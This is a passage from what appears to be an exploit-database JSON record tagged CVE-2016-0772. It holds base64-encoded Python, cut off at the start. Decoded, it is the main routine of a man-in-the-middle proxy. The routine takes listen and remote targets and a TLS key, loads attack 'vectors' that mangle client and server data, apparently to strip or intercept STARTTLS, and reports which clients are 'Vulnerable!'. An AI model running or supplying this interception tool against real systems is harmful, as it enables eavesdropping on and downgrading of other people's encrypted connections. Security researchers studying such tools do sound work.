XJzZXIuYWRkX29wdGlvbigiLWwiLCAiLS1saXN0ZW4iLCBkZXN0PSJsaXN0ZW4iLCBoZWxwPSJsaXN0ZW4gaXA6cG9ydCBbZGVmYXVsdDogMC4wLjAuMDo8cmVtb3RlX3BvcnQ+XSIpDQogICAgcGFyc2VyLmFkZF9vcHRpb24oIi1yIiwgIi0tcmVtb3RlIiwgZGVzdD0icmVtb3RlIiwgaGVscD0icmVtb3RlIHRhcmdldCBpcDpwb3J0IHRvIGZvcndhcmQgc2Vzc2lvbnMgdG8iKQ0KICAgIHBhcnNlci5hZGRfb3B0aW9uKCItayIsICItLWtleSIsIGRlc3Q9ImtleSIsIGRlZmF1bHQ9InNlcnZlci5wZW0iLCBoZWxwPSJTU0wgQ2VydGlmaWNhdGUgYW5kIFByaXZhdGUga2V5IGZpbGUgdG8gdXNlLCBQRU0gZm9ybWF0IGFzc3VtZWQgW2RlZmF1bHQ6ICVkZWZhdWx0XSIpDQogICAgcGFyc2VyLmFkZF9vcHRpb24oIi1zIiwgIi0tZ2VuZXJpYy1zc2wtaW50ZXJjZXB0IiwNCiAgICAgICAgICAgICAgICAgIGFjdGlvbj0ic3RvcmVfdHJ1ZSIsIGRlc3Q9ImdlbmVyaWNfdGxzX2ludGVyY2VwdCIsIGRlZmF1bHQ9RmFsc2UsDQogICAgICAgICAgICAgICAgICBoZWxwPSJkeW5hbWljYWxseSBpbnRlcmNlcHQgU1NML1RMUyIpDQogICAgcGFyc2VyLmFkZF9vcHRpb24oIi1iIiwgIi0tYnVmc2l6IiwgZGVzdD0iYnVmZmVyX3NpemUiLCB0eXBlPSJpbnQiLCBkZWZhdWx0PTQwOTYpDQogICAgICAgIA0KICAgIGFsbF92ZWN0b3JzID0gW10NCiAgICBmb3IgcHJvdG8gaW4gKHYgZm9yIHYgaW4gZGlyKFZlY3RvcnMpIGlmIG5vdCB2LnN0YXJ0c3dpdGgoIl8iKSk6DQogICAgICAgIGZvciB0ZXN0IGluICh2IGZvciB2IGluIGRpcihnZXRhdHRyKFZlY3RvcnMscHJvdG8pKSBpZiBub3Qgdi5zdGFydHN3aXRoKCJfIikpOg0KICAgICAgICAgICAgYWxsX3ZlY3RvcnMuYXBwZW5kKCIlcy4lcyIlKHByb3RvLHRlc3QpKQ0KICAgIHBhcnNlci5hZGRfb3B0aW9uKCIteCIsICItLXZlY3RvcnMiLA0KICAgICAgICAgICAgICAgICAgZGVmYXVsdD0iQUxMIiwNCiAgICAgICAgICAgICAgICAgIGhlbHA9IkNvbW1hIHNlcGFyYXRlZCBsaXN0IG9mIHZlY3RvcnMuIFVzZSAnQUxMJyAoZGVmYXVsdCkgdG8gc2VsZWN0IGFsbCB2ZWN0b3JzLCAnTk9ORScgZm9yIHRjcC9zc2wgcHJveHkgbW9kZS4gQXZhaWxhYmxlIHZlY3RvcnM6ICIrIiwgIi5qb2luKGFsbF92ZWN0b3JzKSsiIg0KICAgICAgICAgICAgICAgICAgIiBbZGVmYXVsdDogJWRlZmF1bHRdIikNCiAgICAjIHBhcnNlIGFyZ3MNCiAgICAob3B0aW9ucywgYXJncykgPSBwYXJzZXIucGFyc2VfYXJncygpDQogICAgIyBub3JtYWxpemUgYXJncw0KICAgIGlmIG5vdCBvcHRpb25zLnZlcmJvc2U6DQogICAgICAgIGxvZ2dlci5zZXRMZXZlbChsb2dnaW5nLklORk8pDQogICAgaWYgbm90IG9wdGlvbnMucmVtb3RlOg0KICAgICAgICBwYXJzZXIuZXJyb3IoIm1hbmRhdG9yeSBvcHRpb246IHJlbW90ZSIpDQogICAgaWYgIjoiIG5vdCBpbiBvcHRpb25zLnJlbW90ZSBhbmQgIjoiIGluIG9wdGlvbnMubGlzdGVuOg0KICAgICAgICAjIG5vIHBvcnQgaW4gcmVtb3RlLCBidXQgdGhlcmUgaXMgb25lIGluIGxpc3Rlbi4gdXNlIHRoaXMgb25lDQogICAgICAgIG9wdGlvbnMucmVtb3RlID0gKG9wdGlvbnMucmVtb3RlLnN0cmlwKCksIGludChvcHRpb25zLmxpc3Rlbi5zdHJpcCgpLnNwbGl0KCI6IilbMV0pKQ0KICAgICAgICBsb2dnZXIud2FybmluZygibm8gcmVtb3RlIHBvcnQgc3BlY2lmaWVkIC0gZmFsbGluZyBiYWNrIHRvICVzOiVkIChsaXN0ZW4gcG9ydCkiJW9wdGlvbnMucmVtb3RlKQ0KICAgIGVsaWYgIjoiIGluIG9wdGlvbnMucmVtb3RlOg0KICAgICAgICBvcHRpb25zLnJlbW90ZSA9IG9wdGlvbnMucmVtb3RlLnN0cmlwKCkuc3BsaXQoIjoiKQ0KICAgICAgICBvcHRpb25zLnJlbW90ZSA9IChvcHRpb25zLnJlbW90ZVswXSwgaW50KG9wdGlvbnMucmVtb3RlWzFdKSkNCiAgICBlbHNlOg0KICAgICAgICBwYXJzZXIuZXJyb3IoIm5laXRoZXIgcmVtb3RlIG5vciBsaXN0ZW4gaXMgaW4gdGhlIGZvcm1hdCA8aG9zdD46PHBvcnQ+IikNCiAgICBpZiBub3Qgb3B0aW9ucy5saXN0ZW46DQogICAgICAgIGxvZ2dlci53YXJuaW5nKCJubyBsaXN0ZW4gcG9ydCBzcGVjaWZpZWQgLSBmYWxsaW5nIGJhY2sgdG8gMC4wLjAuMDolZCAocmVtb3RlIHBvcnQpIiVvcHRpb25zLnJlbW90ZVsxXSkNCiAgICAgICAgb3B0aW9ucy5saXN0ZW4gPSAoIjAuMC4wLjAiLG9wdGlvbnMucmVtb3RlWzFdKQ0KICAgIGVsaWYgIjoiIGluIG9wdGlvbnMubGlzdGVuOg0KICAgICAgICBvcHRpb25zLmxpc3RlbiA9IG9wdGlvbnMubGlzdGVuLnN0cmlwKCkuc3BsaXQoIjoiKQ0KICAgICAgICBvcHRpb25zLmxpc3RlbiA9IChvcHRpb25zLmxpc3RlblswXSwgaW50KG9wdGlvbnMubGlzdGVuWzFdKSkNCiAgICBlbHNlOg0KICAgICAgICBvcHRpb25zLmxpc3RlbiA9IChvcHRpb25zLmxpc3Rlbi5zdHJpcCgpLCBvcHRpb25zLnJlbW90ZVsxXSkNCiAgICAgICAgbG9nZ2VyLndhcm5pbmcoIm5vIGxpc3RlbiBwb3J0IHNwZWNpZmllZCAtIGZhbGxpbmcgYmFjayB0byAlczolZCAocmVtb3RlIHBvcnQpIiVvcHRpb25zLmxpc3RlbikNCiAgICBvcHRpb25zLnZlY3RvcnMgPSBbby5zdHJpcCgpIGZvciBvIGluIG9wdGlvbnMudmVjdG9ycy5zdHJpcCgpLnNwbGl0KCIsIildDQogICAgaWYgJ0FMTCcgaW4gKHYudXBwZXIoKSBmb3IgdiBpbiBvcHRpb25zLnZlY3RvcnMpOg0KICAgICAgICBvcHRpb25zLnZlY3RvcnMgPSBhbGxfdmVjdG9ycw0KICAgIGVsaWYgJ05PTkUnIGluICh2LnVwcGVyKCkgZm9yIHYgaW4gb3B0aW9ucy52ZWN0b3JzKToNCiAgICAgICAgb3B0aW9ucy52ZWN0b3JzID0gW10NCiAgICBWZWN0b3JzLl9UTFNfQ0VSVEZJTEUgPSBWZWN0b3JzLl9UTFNfS0VZRklMRSA9IG9wdGlvbnMua2V5DQogICAgICAgICAgDQogICAgIyAtLS0tIHN0YXJ0IHVwIGVuZ2luZXMgLS0tLQ0KICAgIHByeCA9IFByb3h5U2VydmVyKGxpc3Rlbj1vcHRpb25zLmxpc3RlbiwgdGFyZ2V0PW9wdGlvbnMucmVtb3RlLCANCiAgICAgICAgICAgICAgICAgICAgICBidWZmZXJfc2l6ZT1vcHRpb25zLmJ1ZmZlcl9zaXplLCBkZWxheT0wLjAwMDAxKQ0KICAgIGxvZ2dlci5pbmZvKCIlcyByZWFkeS4iJXByeCkNCiAgICByZXdyaXRlID0gUmV3cml0ZURpc3BhdGNoZXIoZ2VuZXJpY190bHNfaW50ZXJjZXB0PW9wdGlvbnMuZ2VuZXJpY190bHNfaW50ZXJjZXB0KQ0KICAgIA0KICAgIGZvciBjbGFzc25hbWUgaW4gb3B0aW9ucy52ZWN0b3JzOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBwcm90bywgdmVjdG9yID0gY2xhc3NuYW1lLnNwbGl0KCcuJywxKQ0KICAgICAgICAgICAgY2xzX3Byb3RvID0gZ2V0YXR0cihnbG9iYWxzKCkuZ2V0KCJWZWN0b3JzIikscHJvdG8pDQogICAgICAgICAgICBjbHNfdmVjdG9yID0gZ2V0YXR0cihjbHNfcHJvdG8sIHZlY3RvcikNCiAgICAgICAgICAgIHJld3JpdGUuYWRkKGNsc19wcm90by5fUFJPVE9fSUQsIGNsc192ZWN0b3IpDQogICAgICAgICAgICBsb2dnZXIuZGVidWcoIiogYWRkZWQgdmVjdG9yIChwb3J0OiUtNXMsIHByb3RvOiU4cyk6ICVzIiUoY2xzX3Byb3RvLl9QUk9UT19JRCwgcHJvdG8sIHJlcHIoY2xzX3ZlY3RvcikpKQ0KICAgICAgICBleGNlcHQgRXhjZXB0aW9uLCBlOg0KICAgICAgICAgICAgbG9nZ2VyLmVycm9yKCIqIGVycm9yIC0gZmFpbGVkIHRvIGFkZDogJXMiJWNsYXNzbmFtZSkNCiAgICAgICAgICAgIHBhcnNlci5lcnJvcigiaW52YWxpZCB2ZWN0b3I6ICVzIiVjbGFzc25hbWUpDQoNCiAgICBsb2dnaW5nLmluZm8ocmVwcihyZXdyaXRlKSkNCiAgICBwcnguc2V0X2NhbGxiYWNrKCJtYW5nbGVfc2VydmVyX2RhdGEiLCByZXdyaXRlLm1hbmdsZV9zZXJ2ZXJfZGF0YSkNCiAgICBwcnguc2V0X2NhbGxiYWNrKCJtYW5nbGVfY2xpZW50X2RhdGEiLCByZXdyaXRlLm1hbmdsZV9jbGllbnRfZGF0YSkNCiAgICBwcnguc2V0X2NhbGxiYWNrKCJvbl9yZWN2X3BlZWsiLCByZXdyaXRlLm9uX3JlY3ZfcGVlaykNCiAgICB0cnk6DQogICAgICAgIHByeC5tYWluX2xvb3AoKQ0KICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoNCiAgICAgICAgbG9nZ2VyLndhcm5pbmcoICJDdHJsIEMgLSBTdG9wcGluZyBzZXJ2ZXIiKQ0KICAgICAgICByZXQrPTENCiAgICAgICAgDQogICAgbG9nZ2VyLmluZm8oIiAtLSBhdWRpdCByZXN1bHRzIC0tIikNCiAgICBmb3IgY2xpZW50LHJlc3VsdGxpc3QgaW4gcmV3cml0ZS5nZXRfcmVzdWx0c19ieV9jbGllbnRzKCkuaXRlcml0ZW1zKCk6DQogICAgICAgIGxvZ2dlci5pbmZvKCJbKl0gY2xpZW50OiAlcyIlY2xpZW50KQ0KICAgICAgICBmb3IgbWFuZ2xlLCByZXN1bHQgaW4gcmVzdWx0bGlzdDoNCiAgICAgICAgICAgIGxvZ2dlci5pbmZvKCIgICAgWyUtMTFzXSAlcyIlKCJWdWxuZXJhYmxlISIgaWYgcmVzdWx0IGVsc2UgIiAiLHJlcHIobWFuZ2xlKSkpDQogICAgICAgIA0KICAgIHN5cy5leGl0KHJldCkNCiAgICANCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQogICAgbWFpbigp", 
    "id": "43500", 
    "cves": [
        "CVE-2016-0772"
    ]
}